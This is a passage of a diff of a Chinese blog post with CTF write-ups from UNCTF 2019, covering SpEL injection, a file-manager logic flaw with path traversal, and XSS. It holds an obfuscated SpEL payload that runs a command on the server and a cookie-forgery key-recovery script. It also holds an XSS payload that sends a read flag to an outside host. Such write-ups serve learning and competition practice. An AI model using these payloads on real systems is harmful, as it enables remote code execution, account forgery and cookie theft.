shellcode=&quot;(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(66)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(41)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(40)).concat(T(java.lang.Character).toString(41))&quot;;</span><br><span class="line">        String payload=&quot;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;js\&quot;).eval(&quot;+shellcode+&quot;)&quot;;</span><br><span class="line"></span><br><span class="line">//        payload = &quot;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;js\&quot;)&quot;;</span><br><span class="line">        postMethod.setParameter(&quot;name&quot;,payload);</span><br><span class="line">        httpClient.executeMethod(postMethod);</span><br><span class="line">        System.out.println(postMethod.getResponseBodyAsString());</span><br><span class="line">        postMethod.releaseConnection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
 <p>  <img src="https://i.loli.net/2019/11/14/wclOQby7Yio35fX.png" alt="Snipaste_2019-11-14_09-18-57.png"></p>
 <p>  分析不动，学！！</p>
 <p>  ====未完待续</p>
-<h3 id="easy-file-manage"><a href="#easy-file-manage" class="headerlink" title="easy_file_manage"></a>easy_file_manage</h3><h3 id="superwaf"><a href="#superwaf" class="headerlink" title="superwaf"></a>superwaf</h3><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p>  <a href="https://www.ctfwp.com/articals/2019unctf.html" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019unctf.html</a> </p>
+<h3 id="easy-file-manage"><a href="#easy-file-manage" class="headerlink" title="easy_file_manage"></a>easy_file_manage</h3><p>  注册登录，提示<code>robots</code>，查看源码</p>
+<p>  <code>rename.php</code>、<code>flag.php</code>、<code>download.php</code></p>
+<p>  主要是<code>rename.php</code>中存在逻辑漏洞，先修改数据库再对后缀进行判断</p>
+<p>  <img src="https://i.loli.net/2019/11/14/yjtBLMksbDmcqhn.png" alt="Snipaste_2019-11-14_11-20-28.png"></p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;config.php&quot;);</span><br><span class="line">include(&quot;function.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>  这里</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/config|flag/i&quot;,$_POST[&apos;new_filename&apos;]))&#123;</span><br><span class="line">	$error_str = &quot;no config or flag~&quot;;					include(&quot;error.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么利用之前的逻辑漏洞下载<code>function.php</code></p>
+<p>一般用户上传的文件会存在<code>upload/</code>目录下，那么这里造<code>../function.php</code>，发现不行，再上一层<code>../../function.php</code></p>
+<p>  <img src="https://i.loli.net/2019/11/14/eod7LV1FXTpZyRB.png" alt="Snipaste_2019-11-14_11-30-33.png"></p>
+<p>记住这里的<code>f_id</code>，即要下载的<code>f_id</code>，成功下载</p>
+<p>查看<code>flag.php</code></p>
+<p><img src="https://i.loli.net/2019/11/14/5YvimaCIJyQxe9u.png" alt="Snipaste_2019-11-14_11-35-34.png"></p>
+<p>首先需要绕过<code>check_login()</code>，跟踪<img src="https://i.loli.net/2019/11/14/erj2MzwIuLH8iSt.png" alt="Snipaste_2019-11-14_11-36-27.png"></p>
+<p>对cookie解密，跟踪<code>decrypt_str()</code></p>
+<p>  <img src="https://i.loli.net/2019/11/14/CknBzcRDuULNa2y.png" alt="Snipaste_2019-11-14_11-37-59.png"></p>
+<p>这好像是远古时期某个cms的加密，可以根据一组明文和密文还原出<code>key</code>，这里要根据具体文件猜测下明文，即<code>$info</code>，</p>
+<p>比如我的id是28，那么应该是<code>$info=[&#39;user_id&#39;=&gt;&#39;28&#39;];</code>，暂时未知其他<code>$info数组</code>的其他信息，<code>cookie[user]</code>如下</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25B5%2582%257B%258D%25DA%25BE%257F%2590%258Ej%25BE%25C6%25C4%25BD%25A4%25C2%25B8j%2584%25BC%2599%257D%257D%2594%25C7%2582%2581%258D%2581%25C0%25B8%25BE%25C6%25B6%25AA%25C0%25C4m%2580%25CC%258E%257C%2583u%25C1%25AD%25A7%25BBv%2583%25C6</span><br></pre></td></tr></table></figure>
+
+<p>  发现<code>urldecode()</code>两次之后仍然有51位，两种思路，一种是猜<code>$info</code>，最好能使其到51位，另一种是看看运气只跑24位，因为<code>$key</code>会循环，并且即使增加别的key-value大致不变</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize([&apos;id&apos;=&gt;&apos;28&apos;,&apos;name&apos;=&gt;&apos;bbbb&apos;])</span><br><span class="line">serialize([&apos;id&apos;=&gt;&apos;28&apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/14/ZcquPY4BpD7CAVy.png" alt="Snipaste_2019-11-14_12-18-48.png"></p>
+<p>  那么我就可以</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$info=[&apos;user_id&apos;=&gt;&apos;28&apos;];</span><br><span class="line">    $info = serialize($info);</span><br><span class="line">    // echo serialize([&apos;id&apos;=&gt;&apos;28&apos;,&apos;name&apos;=&gt;&apos;bbbb&apos;]).&quot;\n&quot;;</span><br><span class="line">    echo $info.&quot;\n&quot;;</span><br><span class="line">    // echo strlen($info);</span><br><span class="line">    $info1 = &apos;%25B5%2582%257B%258D%25DA%25BE%257F%2590%258Ej%25BE%25C6%25C4%25BD%25A4%25C2%25B8j%2584%25BC%2599%257D%257D%2594%25C7%2582%2581%258D%2581%25C0%25B8%25BE%25C6%25B6%25AA%25C0%25C4m%2580%25CC%258E%257C%2583u%25C1%25AD%25A7%25BBv%2583%25C6&apos;;</span><br><span class="line">    $info1 = urldecode(urldecode($info1));</span><br><span class="line">    for($i = 0; $i &lt; strlen($info); $i++)</span><br><span class="line">    &#123;</span><br><span class="line">    	echo ord($info1[$i]).&quot; &quot;.ord($info[$i]).&quot;\n&quot;;</span><br><span class="line">        $key .= chr(ord($info1[$i])-ord($info[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump($key);</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p><img src="https://i.loli.net/2019/11/14/6S2GPcbBJkWQzDx.png" alt="Snipaste_2019-11-14_12-26-05.png"></p>
+<p>开始重复即说明<code>key</code>完整了</p>
+<p>根据<code>flag.php</code>的要求构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$info=[&apos;user_id&apos;=&gt;99999999999999999,&apos;flag_pls&apos;=&gt;&apos;test&apos;];</span><br><span class="line"></span><br><span class="line">%B5%82%7B%8D%DA%BE%7F%90%8Ej%BE%C6%C4%BD%A4%C2%B8j%84%BC%99%84%7E%92%8D%81%82%8C%98%84%7E%92%8D%81%82%8C%98%84%80%CC%8E%80%83u%C5%B7%A6%C0%B3%B8%B5%C6%81%86%B8%93%88%82k%C7%C4%BE%B9%7B%8F%C5</span><br><span class="line"></span><br><span class="line">%25B5%2582%257B%258D%25DA%25BE%257F%2590%258Ej%25BE%25C6%25C4%25BD%25A4%25C2%25B8j%2584%25BC%2599%2584%257E%2592%258D%2581%2582%258C%2598%2584%257E%2592%258D%2581%2582%258C%2598%2584%2580%25CC%258E%2580%2583u%25C5%25B7%25A6%25C0%25B3%25B8%25B5%25C6%2581%2586%25B8%2593%2588%2582k%25C7%25C4%25BE%25B9%257B%258F%25C5</span><br></pre></td></tr></table></figure>
+
+<p><strong>一开始在phpstorm运行结果不同，同样的代码sublime运行结果和wp一样，我佛了😒</strong></p>
+<p><img src="https://i.loli.net/2019/11/14/cTmhG39QuVYBJjs.png" alt="Snipaste_2019-11-14_13-26-40.png"></p>
+<h3 id="superwaf"><a href="#superwaf" class="headerlink" title="superwaf"></a>superwaf</h3><p>验证码可以爆破</p>
+<blockquote>
+<p>绕过waf的思路是bypass xss/csp &lt;frameset onpageshow = ，扫描下目录容易发现Admin dir的路径为/admin/admin.php，使用exp脚本生成的payload如下图3所示，具体细节部分在exp文件夹下的exp.py文件中：</p>
+</blockquote>
+<p>😑😑😑😑没给exp，鸽了鸽了</p>
+<h3 id="EasyXSS"><a href="#EasyXSS" class="headerlink" title="EasyXSS"></a>EasyXSS</h3><p>提示 Flag 在 Cookie 里，设置了 <code>HttpOnly</code>。 </p>
+<blockquote>
+<p>设置httponly的cookie是无法被前端读取的</p>
+</blockquote>
+<p>先简单测试xss，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;&apos; onerror=&apos;alert(1)&apos;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>出现弹框，那么访问下提示路径，抓包</p>
+<p><img src="https://i.loli.net/2019/11/14/Hdbw3OACRQMn6uZ.png" alt="Snipaste_2019-11-14_15-19-41.png"></p>
+<blockquote>
+<p>再来看看页面的 ACL 头，可以带着 Cookie 发 XHR 请求。 </p>
+</blockquote>
+<p>上面这句话不是很李姐</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=new</span><br><span class="line">XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function()&#123;if(xmlhttp.readyState==4)&#123;location.href=&apos;http://xss.buuoj.cn/ukh1Uw?flag=&apos;</span><br><span class="line">xmlhttp.responseText.match(&apos;flag\\&#123;(.\*?)\\&#125;&apos;)[1]&#125;&#125;;xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\&gt;</span><br></pre></td></tr></table></figure>
+
+<p>找个xss平台接收一下，发现没收到。。。</p>
+<p>可能是姿势不对把，xss真的需要补一补</p>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p>  <a href="https://www.ctfwp.com/articals/2019unctf.html" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019unctf.html</a> </p>
 <p>  <a href="https://xz.aliyun.com/t/6661?tdsourcetag=s_pctim_aiomsg#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/6661?tdsourcetag=s_pctim_aiomsg#toc-4</a> </p>
 
       
